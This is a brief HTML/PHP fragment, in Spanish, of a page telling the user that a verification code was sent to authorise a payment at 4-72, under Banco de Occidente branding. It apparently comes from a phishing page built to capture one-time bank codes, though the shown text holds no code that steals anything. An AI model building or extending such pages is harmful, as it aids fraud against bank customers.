...
<body>
    <div class="details" >
        ...
        <a style="color:black;">Acabamos de enviarte un código de verificación por correo electronico o mensaje de texto. Para autorizar un pago en 4-72 el <?php echo $fechaActual; ?> <br>Banco de Occidente nunca te solicitará información confidencial o financiera como usuarios y claves de acceso.</a><br><p></p>
